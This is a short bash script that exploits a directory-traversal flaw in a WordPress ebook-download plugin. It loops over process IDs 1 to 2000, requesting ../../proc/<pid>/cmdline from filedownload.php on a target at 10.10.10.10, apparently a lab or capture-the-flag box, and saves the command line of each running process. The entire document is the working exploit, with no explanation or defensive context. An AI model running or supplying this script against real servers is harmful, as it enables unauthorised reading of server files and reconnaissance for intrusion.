#!/bin/bash
# Author: Mardcore

for i in $(seq 1 2000);
  do curl http://10.10.10.10/wp-content/plugins/ebook-download/filedownload.php\?ebookdownloadurl=../../../../../../../../../proc/$i/cmdline | sed 's/cmdline/\n/g' | tail -n +4 | sed 's/<script>/\n/g' | head -n -1 >> proc;
done

cat proc | sed '/^ *$/d' > process
rm proc
